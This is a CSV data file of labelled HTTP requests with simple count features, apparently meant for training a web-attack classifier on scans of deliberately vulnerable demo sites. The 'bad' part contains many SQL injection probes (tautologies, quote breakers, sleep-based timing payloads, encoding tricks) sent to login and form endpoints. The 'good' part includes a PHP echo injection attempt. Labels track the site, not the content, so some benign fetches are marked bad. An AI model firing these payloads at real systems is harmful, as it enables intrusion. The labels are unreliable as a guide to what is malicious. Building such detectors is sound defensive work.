,method,body,path,single_q,double_q,dashes,braces,spaces,badwords,class
0,GET,b'',b'/',0,0,0,0,0,0,good
1,GET,b'',b'/HmMjVS0m',0,0,0,0,0,0,good
2,GET,b'',b'/TI5tCZ1t',0,0,0,0,0,0,good
3,GET,b'',b'/VYZEUtrA',0,0,0,0,0,0,good
4,GET,b'',b'/',0,0,0,0,0,0,good
5,GET,b'',b'/robots.txt',0,0,0,0,0,0,good
6,POST,b'goButton=go&searchFor=1',b'/search.php?test=query',0,0,0,0,0,0,good
7,GET,b'',b'/hpp',0,0,0,0,0,0,good
8,GET,b'',b'/login.php',0,0,0,0,0,0,good
9,GET,b'',b'/search.php',0,0,0,0,0,0,good
10,GET,b'',b'/artists.php',0,0,0,0,0,0,good
11,GET,b'',b'/index.php',0,0,0,0,0,0,good
12,GET,b'',b'/cart.php',0,0,0,0,0,0,good
13,GET,b'',b'/guestbook.php',0,0,0,0,0,0,good
14,GET,b'',b'/categories.php',0,0,0,0,0,0,good
15,GET,b'',b'/AJAX/index.php',0,0,0,0,0,0,good
16,GET,b'',b'/disclaimer.php',0,0,0,0,0,0,good
17,GET,b'',b'/userinfo.php',0,0,0,0,0,0,good
18,GET,b'',b'/privacy.php',0,0,0,0,0,0,good
19,GET,b'',b'/Mod_Rewrite_Shop',0,0,0,0,0,0,good
20,GET,b'',b'/Flash/add.swf',0,0,0,0,0,0,good
21,GET,b'',b'/showimage.php',0,0,0,0,0,0,good
22,GET,b'',b'/signup.php',0,0,0,0,0,0,good
23,GET,b'',b'/product.php',0,0,0,0,0,0,good
24,GET,b'',b'/redir.php',0,0,0,0,0,0,good
25,GET,b'',b'/sendcommand.php',0,0,0,0,0,0,good
26,GET,b'',b'/index.bak',0,0,0,0,0,0,good
27,GET,b'',b'/listproducts.php',0,0,0,0,0,0,good
28,GET,b'',b'/logout.php',0,0,0,0,0,0,good
29,GET,b'',b'/database_connect.php',0,0,0,0,0,0,good
30,GET,b'',b'/crossdomain.xml',0,0,0,0,0,0,good
31,GET,b'',b'/comment.php',0,0,0,0,0,0,good
32,GET,b'',b'/clientaccesspolicy.xml',0,0,0,0,0,0,good
33,GET,b'',b'/clearguestbook.php',0,0,0,0,0,0,good
34,GET,b'',b'/404.php',0,0,0,0,0,0,good
35,GET,b'',b'/wvstests/pmwiki_2_1_19/scripts/version.php',0,0,0,0,0,0,good
36,GET,b'',b'/vendor/installed.json',0,0,0,0,0,0,good
37,GET,b'',b'/secured/newuser.php',0,0,0,0,0,0,good
38,GET,b'',b'/secured/office.htm',0,0,0,0,0,0,good
39,GET,b'',b'/secured/index.php',0,0,0,0,0,0,good
40,GET,b'',b'/secured/phpinfo.php',0,0,0,0,0,0,good
41,GET,b'',b'/secured/database_connect.php',0,0,0,0,0,0,good
42,GET,b'',b'/pictures/path-disclosure-win.html',0,0,0,0,0,0,good
43,GET,b'',b'/pictures/wp-config.bak',0,0,0,0,0,0,good
44,GET,b'',b'/pictures/credentials.txt',0,0,0,0,0,0,good
45,GET,b'',b'/pictures/path-disclosure-unix.html',0,0,0,0,0,0,good
46,GET,b'',b'/pictures/ipaddresses.txt',0,0,0,0,0,0,good
47,GET,b'',b'/pictures/WS_FTP.LOG',0,0,0,0,0,0,good
48,GET,b'',b'/hpp/test.php',0,0,0,0,0,0,good
49,GET,b'',b'/hpp/index.php',0,0,0,0,0,0,good
50,GET,b'',b'/hpp/params.php',0,0,0,0,0,0,good
51,GET,b'',b'/bxss/index.php',0,0,0,0,0,0,good
52,GET,b'',b'/bxss/cleanDatabase.php',0,0,0,0,0,0,good
53,GET,b'',b'/bxss/vuln.php',0,0,0,0,0,0,good
54,GET,b'',b'/bxss/test.js',0,0,0,0,0,0,good
55,GET,b'',b'/bxss/database_connect.php',0,0,0,0,0,0,good
56,GET,b'',b'/bxss/adminPan3l/index.php',0,0,0,0,0,0,good
57,GET,b'',b'/admin/create.sql',0,0,0,0,0,0,good
58,GET,b'',b'/adm1nPan3l/index.php',0,0,0,0,0,0,good
59,GET,b'',b'/_mmServerScripts/mysql.php',0,0,0,0,0,0,good
60,GET,b'',b'/_mmServerScripts/MMHTTPDB.php',0,0,0,0,0,0,good
61,GET,b'',b'/Templates/main_dynamic_template.dwt.php',0,0,0,0,0,0,good
62,GET,b'',b'/Mod_Rewrite_Shop/details.php',0,0,0,0,0,0,good
63,GET,b'',b'/Mod_Rewrite_Shop/index.php',0,0,0,0,0,0,good
64,GET,b'',b'/Mod_Rewrite_Shop/buy.php',0,0,0,0,0,0,good
65,GET,b'',b'/Mod_Rewrite_Shop/rate.php',0,0,0,0,0,0,good
66,GET,b'',b'/Mod_Rewrite_Shop/.htaccess',0,0,0,0,0,0,good
67,GET,b'',b'/Connections/DB_Connection.php',0,0,0,0,0,0,good
68,GET,b'',b'/CVS/Repository',0,0,0,0,0,0,good
69,GET,b'',b'/AJAX/infoartist.php',0,0,0,0,0,0,good
70,GET,b'',b'/AJAX/artists.php',0,0,0,0,0,0,good
71,GET,b'',b'/AJAX/titles.php',0,0,0,0,0,0,good
72,GET,b'',b'/AJAX/showxml.php',0,0,0,0,0,0,good
73,GET,b'',b'/AJAX/categories.php',0,0,0,0,0,0,good
74,GET,b'',b'/AJAX/infocateg.php',0,0,0,0,0,0,good
75,GET,b'',b'/AJAX/infotitle.php',0,0,0,0,0,0,good
76,GET,b'',b'/.idea/workspace.xml',0,0,0,0,0,0,good
77,GET,b'',b'/AJAX/htaccess.conf',0,0,0,0,0,0,good
78,GET,b'',b'/.idea/vcs.xml',0,0,0,0,0,0,good
79,GET,b'',b'/.idea/modules.xml',0,0,0,0,0,0,good
80,GET,b'',b'/.idea/encodings.xml',0,0,0,0,0,0,good
81,GET,b'',b'/.idea/misc.xml',0,0,0,0,0,0,good
82,GET,b'',b'/.idea/.name',0,0,0,0,0,0,good
83,GET,b'',b'/.idea/acuart.iml',0,0,0,0,0,0,good
84,GET,b'',b'/.idea/scopes/scope_settings.xml',0,0,0,0,0,0,good
85,GET,b'',b'/AJAX',0,0,0,0,0,0,good
86,GET,b'',b'/images',0,0,0,0,0,0,good
87,GET,b'',b'/Flash',0,0,0,0,0,0,good
88,GET,b'',b'/wvstests',0,0,0,0,0,0,good
89,GET,b'',b'/wvstests/pmwiki_2_1_19',0,0,0,0,0,0,good
90,GET,b'',b'/wvstests/pmwiki_2_1_19/scripts',0,0,0,0,0,0,good
91,GET,b'',b'/vendor',0,0,0,0,0,0,good
92,GET,b'',b'/secured',0,0,0,0,0,0,good
93,GET,b'',b'/pictures',0,0,0,0,0,0,good
94,GET,b'',b'/bxss',0,0,0,0,0,0,good
95,GET,b'',b'/bxss/adminPan3l',0,0,0,0,0,0,good
96,GET,b'',b'/admin',0,0,0,0,0,0,good
97,GET,b'',b'/adm1nPan3l',0,0,0,0,0,0,good
98,GET,b'',b'/_mmServerScripts',0,0,0,0,0,0,good
99,GET,b'',b'/Templates',0,0,0,0,0,0,good
100,GET,b'',b'/Mod_Rewrite_Shop/images',0,0,0,0,0,0,good
101,GET,b'',b'/Connections',0,0,0,0,0,0,good
102,GET,b'',b'/CVS',0,0,0,0,0,0,good
103,GET,b'',b'/.idea',0,0,0,0,0,0,good
104,GET,b'',b'/.idea/scopes',0,0,0,0,0,0,good
105,GET,b'',b'/sitemap.xml',0,0,0,0,0,0,good
106,POST,b'pass=acUn3t1x&uname=htxxwdue',b'/userinfo.php',0,0,0,0,0,0,good
107,GET,b'',b'/sitemap.xml.gz',0,0,0,0,0,0,good
108,POST,b'name=anonymous%20user&submit=add%20message&text=1',b'/guestbook.php',0,0,0,0,2,0,good
109,GET,b'',b'/Mod_Rewrite_Shop/',0,0,0,0,0,0,good
110,GET,b'',b'/hpp/',0,0,0,0,0,0,good
111,GET,b'',b'/artists.php?artist=2',0,0,0,0,0,0,good
112,GET,b'',b'/artists.php?artist=3',0,0,0,0,0,0,good
113,GET,b'',b'/listproducts.php?cat=3',0,0,0,0,0,0,good
114,GET,b'',b'/listproducts.php?cat=4',0,0,0,0,0,0,good
115,GET,b'',b'/listproducts.php?cat=1',0,0,0,0,0,0,good
116,POST,b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=txgcsqdc&uuname=abkfulto',b'/secured/newuser.php',0,0,0,0,2,0,good
117,POST,b'comment=1&name=%3cyour%20name%20here%3e&phpaction=echo%20%24_POST%5bcomment%5d%3b&Submit=Submit',b'/comment.php',0,0,0,0,3,0,good
118,GET,b'',b'/redir.php?r=http://www.eclectasy.com/Fractal-Explorer/index.html',0,0,0,0,0,0,good
119,GET,b'',b'/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000',0,0,0,0,0,0,good
120,GET,b'',b'/secured/phpinfo.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42',0,0,0,0,0,0,good
121,GET,b'',b'/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42',0,0,0,0,0,0,good
122,GET,b'',b'/secured/office_files/filelist.xml',0,0,0,0,0,0,good
123,GET,b'',b'/secured/office_files',0,0,0,0,0,0,good
124,GET,b'',b'/medias/css/main.css',0,0,0,0,0,0,good
125,GET,b'',b'/medias/js/common_functions.js',0,0,0,0,0,0,good
126,GET,b'',b'/medias',0,0,0,0,0,0,good
127,GET,b'',b'/medias/css',0,0,0,0,0,0,good
128,GET,b'',b'/medias/img',0,0,0,0,0,0,good
129,GET,b'',b'/medias/js',0,0,0,0,0,0,good
130,GET,b'',b'/hpp/index.php?pp=12',0,0,0,0,0,0,good
131,GET,b'',b'/bxss/vuln.php?id=1',0,0,0,0,0,0,good
132,GET,b'',b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2',0,0,0,0,0,0,good
133,GET,b'',b'/Mod_Rewrite_Shop/Details/color-printer/3',0,0,0,0,0,0,good
134,GET,b'',b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1',0,0,0,0,0,0,good
135,GET,b'',b'/Mod_Rewrite_Shop/Details',0,0,0,0,0,0,good
136,GET,b'',b'/Mod_Rewrite_Shop/Details/color-printer',0,0,0,0,0,0,good
137,GET,b'',b'/Mod_Rewrite_Shop/Details/web-camera-a4tech',0,0,0,0,0,0,good
138,GET,b'',b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink',0,0,0,0,0,0,good
139,GET,b'',b'/AJAX/',0,0,0,0,0,0,good
140,GET,b'',b'/images/',0,0,0,0,0,0,good
141,GET,b'',b'/Flash/',0,0,0,0,0,0,good
142,GET,b'',b'/wvstests/',0,0,0,0,0,0,good
143,GET,b'',b'/wvstests/pmwiki_2_1_19/',0,0,0,0,0,0,good
144,GET,b'',b'/vendor/',0,0,0,0,0,0,good
145,GET,b'',b'/secured/',0,0,0,0,0,0,good
146,GET,b'',b'/wvstests/pmwiki_2_1_19/scripts/',0,0,0,0,0,0,good
147,GET,b'',b'/pictures/',0,0,0,0,0,0,good
148,GET,b'',b'/bxss/',0,0,0,0,0,0,good
149,GET,b'',b'/bxss/adminPan3l/',0,0,0,0,0,0,good
150,GET,b'',b'/admin/',0,0,0,0,0,0,good
151,GET,b'',b'/adm1nPan3l/',0,0,0,0,0,0,good
152,GET,b'',b'/_mmServerScripts/',0,0,0,0,0,0,good
153,GET,b'',b'/Mod_Rewrite_Shop/images/',0,0,0,0,0,0,good
154,GET,b'',b'/Templates/',0,0,0,0,0,0,good
155,GET,b'',b'/Connections/',0,0,0,0,0,0,good
156,GET,b'',b'/.idea/',0,0,0,0,0,0,good
157,GET,b'',b'/.idea/scopes/',0,0,0,0,0,0,good
158,GET,b'',b'/CVS/',0,0,0,0,0,0,good
159,GET,b'',b'/hpp/?pp=12',0,0,0,0,0,0,good
160,GET,b'',b'/product.php?pic=4',0,0,0,0,0,0,good
161,GET,b'',b'/listproducts.php?artist=3',0,0,0,0,0,0,good
162,GET,b'',b'/product.php?pic=1',0,0,0,0,0,0,good
163,GET,b'',b'/listproducts.php?artist=2',0,0,0,0,0,0,good
164,GET,b'',b'/hpp/params.php?aaaa%2f=1',0,0,0,0,0,0,good
165,GET,b'',b'/hpp/params.php?p=valid&pp=12',0,0,0,0,0,0,good
166,GET,b'',b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/',0,0,0,0,0,0,good
167,GET,b'',b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/',0,0,0,0,0,0,good
168,GET,b'',b'/Mod_Rewrite_Shop/Details/color-printer/3/',0,0,0,0,0,0,good
169,POST,b'addcart=1&price=500',b'/cart.php',0,0,0,0,0,0,good
170,POST,b'addcart=4&price=1000',b'/cart.php',0,0,0,0,0,0,good
171,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-2',0,0,0,0,0,0,good
172,GET,b'',b'/Mod_Rewrite_Shop/RateProduct-1.html',0,0,0,0,0,0,good
173,GET,b'',b'/Mod_Rewrite_Shop/RateProduct-2.html',0,0,0,0,0,0,good
174,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-1',0,0,0,0,0,0,good
175,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-3',0,0,0,0,0,0,good
176,GET,b'',b'/Mod_Rewrite_Shop/RateProduct-3.html',0,0,0,0,0,0,good
177,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-1/',0,0,0,0,0,0,good
178,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-2/',0,0,0,0,0,0,good
179,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-3/',0,0,0,0,0,0,good
180,POST,"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",b'/AJAX/showxml.php',0,4,0,0,2,0,good
181,GET,b'',b'/comment.php?aid=2',0,0,0,0,0,0,good
182,GET,b'',b'/comment.php?pid=4',0,0,0,0,0,0,good
183,GET,b'',b'/comment.php?aid=3',0,0,0,0,0,0,good
184,GET,b'',b'/comment.php?pid=7',0,0,0,0,0,0,good
185,GET,b'',b'/comment.php?pid=5',0,0,0,0,0,0,good
186,GET,b'',b'/',0,0,0,0,0,0,good
187,GET,b'',b'/',0,0,0,0,0,0,good
0,GET,b'',b'/',0,0,0,0,0,0,bad
1,GET,b'',b'/acunetix-wvs-test-for-some-inexistent-file',0,0,0,0,0,0,bad
2,GET,b'',b'/',0,0,0,0,0,0,bad
3,GET,b'',b'/HFr4xiA0',0,0,0,0,0,0,bad
4,GET,b'',b'/MXJu959I',0,0,0,0,0,0,bad
5,GET,b'',b'/TxOI7frH',0,0,0,0,0,0,bad
6,GET,b'',b'/',0,0,0,0,0,0,bad
7,GET,b'',b'/favicon.ico',0,0,0,0,0,0,bad
8,GET,b'',b'/search.jsp',0,0,0,0,0,0,bad
9,GET,b'',b'/robots.txt',0,0,0,0,0,0,bad
10,GET,b'',b'/search.jsp?query=1',0,0,0,0,0,0,bad
11,GET,b'',b'/index.jsp?content=business_deposit.htm',0,0,0,0,0,0,bad
12,GET,b'',b'/index.jsp?content=business_retirement.htm',0,0,0,0,0,0,bad
13,GET,b'',b'/index.jsp?content=business_other.htm',0,0,0,0,0,0,bad
14,GET,b'',b'/index.jsp?content=inside.htm',0,0,0,0,0,0,bad
15,GET,b'',b'/index.jsp',0,0,0,0,0,0,bad
16,GET,b'',b'/index.jsp?content=inside_about.htm',0,0,0,0,0,0,bad
17,GET,b'',b'/index.jsp?content=business.htm',0,0,0,0,0,0,bad
18,GET,b'',b'/index.jsp?content=business_lending.htm',0,0,0,0,0,0,bad
19,GET,b'',b'/index.jsp?content=business_insurance.htm',0,0,0,0,0,0,bad
20,GET,b'',b'/index.jsp?content=personal_loans.htm',0,0,0,0,0,0,bad
21,GET,b'',b'/index.jsp?content=business_cards.htm',0,0,0,0,0,0,bad
22,GET,b'',b'/login.jsp',0,0,0,0,0,0,bad
23,GET,b'',b'/subscribe.jsp',0,0,0,0,0,0,bad
24,GET,b'',b'/default.jsp',0,0,0,0,0,0,bad
25,GET,b'',b'/default.jsp?content=security.htm',0,0,0,0,0,0,bad
26,GET,b'',b'/feedback.jsp',0,0,0,0,0,0,bad
27,GET,b'',b'/survey_questions.jsp',0,0,0,0,0,0,bad
28,GET,b'',b'/status_check.jsp',0,0,0,0,0,0,bad
29,GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
30,GET,b'',b'/images',0,0,0,0,0,0,bad
31,GET,b'',b'/swagger',0,0,0,0,0,0,bad
32,GET,b'',b'/sitemap.xml.gz',0,0,0,0,0,0,bad
33,GET,b'',b'/sitemap.xml',0,0,0,0,0,0,bad
34,GET,b'',b'/high_yield_investments.htm',0,0,0,0,0,0,bad
35,GET,b'',b'/retirement.htm',0,0,0,0,0,0,bad
36,GET,b'',b'/pr',0,0,0,0,0,0,bad
37,GET,b'',b'/inside_points_of_interest.htm',0,0,0,0,0,0,bad
38,GET,b'',b'/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm',0,0,0,0,3,0,bad
39,GET,b'',b'/my%20documents/JohnSmith/Bank%20Site%20Documents',0,0,0,0,3,0,bad
40,GET,b'',b'/my%20documents/JohnSmith',0,0,0,0,1,0,bad
41,GET,b'',b'/my%20documents',0,0,0,0,1,0,bad
42,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
43,GET,b'',b'/doLogin',0,0,0,0,0,0,bad
44,GET,b'',b'/doSubscribe',0,0,0,0,0,0,bad
45,POST,b'btnSubmit=Subscribe&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
46,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=qeoavhkm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
47,GET,b'',b'/survey_questions.jsp?step=a',0,0,0,0,0,0,bad
48,GET,b'',b'/sendFeedback',0,0,0,0,0,0,bad
49,GET,b'',b'/swagger/swagger-ui-bundle.js',0,0,0,0,0,0,bad
50,GET,b'',b'/swagger/swagger-ui-standalone-preset.js',0,0,0,0,0,0,bad
51,GET,b'',b'/images/',0,0,0,0,0,0,bad
52,GET,b'',b'/swagger/',0,0,0,0,0,0,bad
53,GET,b'',b'/security.htm',0,0,0,0,0,0,bad
54,GET,b'',b'/pr/',0,0,0,0,0,0,bad
55,GET,b'',b'/survey_questions.jsp?step=b',0,0,0,0,0,0,bad
56,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
57,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
58,GET,b'',b'/util',0,0,0,0,0,0,bad
59,GET,b'',b'/util/',0,0,0,0,0,0,bad
60,GET,b'',b'/',0,0,0,0,0,0,bad
61,GET,b'',b'/',0,0,0,0,0,0,bad
62,POST,b'btnSubmit=Subscribe&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
63,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
64,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
65,POST,b'btnSubmit=Subscribe&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
66,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
67,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
68,GET,b'',b'/high_yield_investments.htm',0,0,0,0,0,0,bad
69,GET,b'',b'/search.jsp?query=1',0,0,0,0,0,0,bad
70,GET,b'',b'/high_yield_investments.htm',0,0,0,0,0,0,bad
71,GET,b'',b'/search.jsp?query=1',0,0,0,0,0,0,bad
72,POST,b'btnSubmit=1%27%22&txtEmail=sample%40email.tst',b'/doSubscribe',1,1,0,0,0,0,bad
73,GET,b'',b'/1%27%22.htm',1,1,0,0,0,0,bad
74,POST,b'btnSubmit=1%27%22&passw=acUn3t1x&uid=1',b'/doLogin',1,1,0,0,0,1,bad
75,POST,b'cfile=1%27%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
76,GET,b'',b'/search.jsp?query=1%27%22',1,1,0,0,0,0,bad
77,POST,b'btnSubmit=%5c&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
78,GET,b'',b'/-1%20or%2057%3d57.htm',0,0,0,0,2,0,bad
79,POST,b'btnSubmit=-1%20or%20108%3d108&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,2,0,bad
80,GET,b'',b'/%5c.htm',0,0,0,0,0,0,bad
81,POST,b'cfile=-1%20or%2089%3d89&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
82,POST,b'cfile=%5c&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
83,POST,b'btnSubmit=-1%20or%20103%3d103&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,2,1,bad
84,POST,b'btnSubmit=%5c&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
85,GET,b'',b'/search.jsp?query=%5c',0,0,0,0,0,0,bad
86,POST,b'btnSubmit=-1%20or%20108%3d0&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,2,0,bad
87,POST,b'cfile=-1%20or%2089%3d0&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
88,POST,b'btnSubmit=1%c0%00xa7%c0%a2&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
89,POST,b'cfile=1%c0%00xa7%c0%a2&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
90,GET,b'',b'/-1%20or%2057%3d0.htm',0,0,0,0,2,0,bad
91,GET,b'',b'/1%c0%00xa7%c0%a2.htm',0,0,0,0,0,0,bad
92,POST,b'btnSubmit=1%c0%00xa7%c0%a2&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
93,GET,b'',b'/search.jsp?query=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
94,POST,b'btnSubmit=-1%20or%20103%3d0&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,2,1,bad
95,GET,b'',b'/search.jsp?query=-1%20or%2084%3d84',0,0,0,0,2,0,bad
96,POST,b'cfile=%40%40JDhrK&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
97,POST,b'btnSubmit=-1%27%20or%20%27102%27%3d%27102&txtEmail=sample%40email.tst',b'/doSubscribe',4,0,0,0,2,0,bad
98,GET,b'',b'/%40%40b5MGP.htm',0,0,0,0,0,0,bad
99,POST,b'cfile=-1%27%20or%20%2724%27%3d%2724&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
100,GET,b'',b'/-1%27%20or%20%2756%27%3d%2756.htm',4,0,0,0,2,0,bad
101,POST,b'btnSubmit=%40%40GLO1K&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
102,POST,b'btnSubmit=%40%40mePlV&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
103,GET,b'',b'/search.jsp?query=-1%20or%2084%3d0',0,0,0,0,2,0,bad
104,GET,b'',b'/search.jsp?query=%40%40UgYQX',0,0,0,0,0,0,bad
105,POST,b'btnSubmit=-1%27%20or%20%27103%27%3d%27103&passw=acUn3t1x&uid=1',b'/doLogin',4,0,0,0,2,1,bad
106,POST,b'cfile=JyI%3d&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
107,POST,b'btnSubmit=JyI%3d&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
108,POST,b'btnSubmit=-1%27%20or%20%27102%27%3d%270&txtEmail=sample%40email.tst',b'/doSubscribe',4,0,0,0,2,0,bad
109,GET,b'',b'/-1%27%20or%20%2756%27%3d%270.htm',4,0,0,0,2,0,bad
110,GET,b'',b'/JyI%3d.htm',0,0,0,0,0,0,bad
111,POST,b'cfile=-1%27%20or%20%2724%27%3d%270&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
112,GET,b'',b'/search.jsp?query=-1%20or%2084-82%20%3d%202',0,0,0,0,4,0,bad
113,GET,b'',b'/search.jsp?query=JyI%3d',0,0,0,0,0,0,bad
114,POST,b'btnSubmit=JyI%3d&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
115,POST,b'btnSubmit=-1%27%20or%20%27103%27%3d%270&passw=acUn3t1x&uid=1',b'/doLogin',4,0,0,0,2,1,bad
116,GET,b'',b'/-1%22%20or%20%2269%22%3d%2269.htm',0,4,0,0,2,0,bad
117,POST,b'btnSubmit=-1%22%20or%20%2239%22%3d%2239&txtEmail=sample%40email.tst',b'/doSubscribe',0,4,0,0,2,0,bad
118,POST,b'btnSubmit=%bf%27%bf%22&txtEmail=sample%40email.tst',b'/doSubscribe',1,1,0,0,0,0,bad
119,POST,b'cfile=%bf%27%bf%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
120,GET,b'',b'/%bf%27%bf%22.htm',1,1,0,0,0,0,bad
121,POST,b'cfile=-1%22%20or%20%2287%22%3d%2287&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
122,GET,b'',b'/search.jsp?query=%bf%27%bf%22',1,1,0,0,0,0,bad
123,GET,b'',b'/search.jsp?query=-1%27%20or%20%2774%27%3d%2774',4,0,0,0,2,0,bad
124,POST,b'btnSubmit=%bf%27%bf%22&passw=acUn3t1x&uid=1',b'/doLogin',1,1,0,0,0,1,bad
125,POST,b'btnSubmit=-1%22%20or%20%2211%22%3d%2211&passw=acUn3t1x&uid=1',b'/doLogin',0,4,0,0,2,1,bad
126,POST,b'cfile=%f0%27%27%f0%22%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
127,POST,b'btnSubmit=-1%22%20or%20%2239%22%3d%220&txtEmail=sample%40email.tst',b'/doSubscribe',0,4,0,0,2,0,bad
128,POST,b'btnSubmit=%f0%27%27%f0%22%22&txtEmail=sample%40email.tst',b'/doSubscribe',2,2,0,0,0,0,bad
129,GET,b'',b'/%f0%27%27%f0%22%22.htm',2,2,0,0,0,0,bad
130,GET,b'',b'/-1%22%20or%20%2269%22%3d%220.htm',0,4,0,0,2,0,bad
131,POST,b'cfile=-1%22%20or%20%2287%22%3d%220&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
132,GET,b'',b'/search.jsp?query=-1%27%20or%20%2774%27%3d%270',4,0,0,0,2,0,bad
133,POST,b'btnSubmit=%f0%27%27%f0%22%22&passw=acUn3t1x&uid=1',b'/doLogin',2,2,0,0,0,1,bad
134,GET,b'',b'/search.jsp?query=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
135,POST,b'btnSubmit=-1%22%20or%20%2211%22%3d%220&passw=acUn3t1x&uid=1',b'/doLogin',0,4,0,0,2,1,bad
136,GET,b'',b'/high_yield_investments%27%20and%20sleep%284%29%3d%27.htm',2,0,0,1,2,1,bad
137,POST,b'btnSubmit=Subscribe%27%20and%20sleep%284%29%3d%27&txtEmail=sample%40email.tst',b'/doSubscribe',2,0,0,1,2,1,bad
138,GET,b'',b'/survey_questions.jsp?step=b',0,0,0,0,0,0,bad
139,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
140,POST,b'cfile=comments.txt%27%20and%20sleep%284%29%3d%27&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,4,1,bad
141,GET,b'',b'/search.jsp?query=-1%27%20or%2074-72%20%3d%20%272',2,0,0,0,4,0,bad
142,GET,b'',b'/survey_questions.jsp?step=a',0,0,0,0,0,0,bad
143,POST,b'btnSubmit=Login%27%20and%20sleep%284%29%3d%27&passw=acUn3t1x&uid=1',b'/doLogin',2,0,0,1,2,2,bad
144,POST,b'cfile=comments.txt&comments=1%27%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
145,GET,b'',b'/high_yield_investments%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',1,0,1,2,6,1,bad
146,POST,b'btnSubmit=Subscribe&txtEmail=1%27%22',b'/doSubscribe',1,1,0,0,0,0,bad
147,POST,b'btnSubmit=Subscribe%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,2,6,1,bad
